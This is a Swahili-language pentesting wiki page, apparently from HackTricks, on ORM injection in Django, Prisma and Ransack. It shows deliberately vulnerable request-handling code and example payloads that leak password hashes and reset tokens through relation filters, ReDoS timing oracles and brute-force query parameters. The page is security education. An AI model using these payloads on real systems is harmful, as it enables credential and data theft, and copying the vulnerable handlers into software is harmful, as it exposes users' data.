# ORM Injection

{{#include ../banners/hacktricks-training.md}}

## Django ORM (Python)

Katika [**post hii**](https://www.elttam.com/blog/plormbing-your-django-orm/) inaelezwa jinsi inavyowezekana kufanya Django ORM iwe hatarini kwa kutumia kwa mfano msimbo kama:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Muonekano wa API wa msingi ambao watumiaji hutuma maombi kwa ajili ya
kutafuta makala
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Kumbuka jinsi request.data yote (ambayo itakuwa json) inapitishwa moja kwa moja kwa **filter objects from the database**. Mshambuliaji anaweza kutuma filters zisizotarajiwa ili kuvuja data zaidi kuliko ilivyotarajiwa kutoka kwake.

Mifano:

- **Login:** Katika kuingia rahisi jaribu kuvuja nywila za watumiaji walioandikishwa ndani yake.
```json
{
"username": "admin",
"password_startswith": "a"
}
```
> [!CAUTION]
> Inawezekana kulazimisha nenosiri hadi litapotea.

- **Kuchuja kwa uhusiano**: Inawezekana kupita katika uhusiano ili kupoteza taarifa kutoka kwa safu ambazo hata hazikutarajiwa kutumika katika operesheni. Kwa mfano, ikiwa inawezekana kupoteza makala zilizoundwa na mtumiaji mwenye uhusiano huu: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains": "pass"
}
```
> [!CAUTION]
> Inawezekana kupata nywila za watumiaji wote ambao wameunda makala

- **Uchujaji wa uhusiano wa wengi kwa wengi**: Katika mfano uliopita hatungeweza kupata nywila za watumiaji ambao hawajaunda makala. Hata hivyo, kufuatia uhusiano mwingine hii inawezekana. Kwa mfano: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith": "admi"
}
```
> [!CAUTION]
> Katika kesi hii tunaweza kupata watumiaji wote katika idara za watumiaji ambao wameunda makala na kisha kuvuja nywila zao (katika json ya awali tunavuja tu majina ya watumiaji lakini kisha inawezekana kuvuja nywila).

- **Kutitumia Django Group na Permission many-to-many relations na watumiaji**: Aidha, mfano wa AbstractUser unatumika kuunda watumiaji katika Django na kwa kawaida mfano huu una **uhusiano wa many-to-many na Permission na Group tables**. Ambayo kimsingi ni njia ya kawaida ya **kufikia watumiaji wengine kutoka kwa mtumiaji mmoja** ikiwa wako katika **kikundi kimoja au wanashiriki ruhusa sawa**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
- **Bypass filter restrictions**: Blogu hiyo hiyo ilipendekeza kupita matumizi ya baadhi ya filtering kama `articles = Article.objects.filter(is_secret=False, **request.data)`. Inawezekana kutoa makala ambazo zina is_secret=True kwa sababu tunaweza kurudi nyuma kutoka kwa uhusiano hadi kwenye jedwali la Article na kuvuja makala za siri kutoka kwa makala zisizo za siri kwa sababu matokeo yanachanganywa na uwanja wa is_secret unakaguliwa katika makala zisizo za siri wakati data inavuja kutoka kwa makala za siri.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
> [!CAUTION]
> Kutumia uhusiano vibaya inawezekana kupita hata filters zilizokusudiwa kulinda data inayonyeshwa.

- **Error/Time based via ReDoS**: Katika mifano ya awali ilitarajiwa kuwa na majibu tofauti ikiwa filtering ilifanya kazi au la ili kuitumia kama oracle. Lakini inaweza kuwa inawezekana kwamba hatua fulani inafanywa katika database na jibu kila wakati ni sawa. Katika hali hii inaweza kuwa inawezekana kufanya makosa ya database kupata oracle mpya.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
- **SQLite**: Haina operator ya regexp kwa default (inahitaji kupakia nyongeza ya upande wa tatu)
- **PostgreSQL**: Haina muda wa kukatika kwa regex wa default na ina uwezekano mdogo wa kurudi nyuma
- **MariaDB**: Haina muda wa kukatika kwa regex

## Prisma ORM (NodeJS)

Ifuatayo ni [**hila zilizotolewa kutoka kwa chapisho hili**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

- **Udhibiti kamili wa kutafuta**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Mshambuliaji ana udhibiti kamili wa chaguo zote za prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Inawezekana kuona kwamba mwili mzima wa javascript unapitishwa kwa prisma ili kufanya maswali.

Katika mfano kutoka kwa chapisho la asili, hii itakagua machapisho yote yaliyoundwa na mtu fulani (kila chapisho linaundwa na mtu fulani) ikirudisha pia taarifa za mtumiaji wa mtu huyo (jina la mtumiaji, nenosiri...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
Ifuatayo inachagua machapisho yote yaliyoundwa na mtu mwenye nenosiri na itarudisha nenosiri:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
- **Udhibiti kamili wa wapi**:

Hebu tuangalie hii ambapo shambulio linaweza kudhibiti `wapi`:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vulnerable to ORM Leaks
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Inawezekana kuchuja nywila za watumiaji moja kwa moja kama:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas",
},
},
},
})
```
> [!CAUTION]
> Kutumia operesheni kama `startsWith` inawezekana kuvuja taarifa.&#x20;

- **Kupita filtering ya uhusiano wa wengi kwa wengi:**&#x20;
```javascript
app.post("/articles", async (req, res) => {
try {
const query = req.body.query
query.published = true
const posts = await prisma.article.findMany({ where: query })
res.json(posts)
} catch (error) {
res.json([])
}
})
```
Inawezekana kuvuja makala ambazo hazijachapishwa kwa kurudi nyuma kwenye uhusiano wa wengi-kwa-wengi kati ya `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Inawezekana pia kuvuja watumiaji wote wanaotumia uhusiano wa mzunguko wa wengi kwa wengi:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
- **Error/Timed queries**: Katika chapisho asilia unaweza kusoma seti kubwa sana ya majaribio yaliyofanywa ili kupata mzigo bora wa kuvuja taarifa kwa kutumia mzigo wa muda. Hii ni:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Mahali ambapo `{CONTAINS_LIST}` ni orodha yenye nyuzi 1000 ili kuhakikisha **jibu linacheleweshwa wakati uvujaji sahihi unapatikana.**

## **Ransack (Ruby)**

Hizi mbinu zilipatikana katika [**post hii**](https://positive.security/blog/ransack-data-exfiltration)**.**

> [!TIP]
> **Kumbuka kwamba Ransack 4.0.0.0 sasa inasisitiza matumizi ya orodha wazi ya ruhusa kwa sifa na ushirikiano unaoweza kutafutwa.**

**Mfano unaoweza kuathirika:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Kumbuka jinsi uchunguzi utavyofafanuliwa na vigezo vilivyotumwa na mshambuliaji. Ilikuwa inawezekana kwa mfano kulazimisha nguvu token ya kurekebisha kwa:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
Kwa kutumia brute-forcing na uhusiano wa uwezekano, ilikuwa inawezekana kuvuja data zaidi kutoka kwenye hifadhidata.

## References

- [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{{#include ../banners/hacktricks-training.md}}
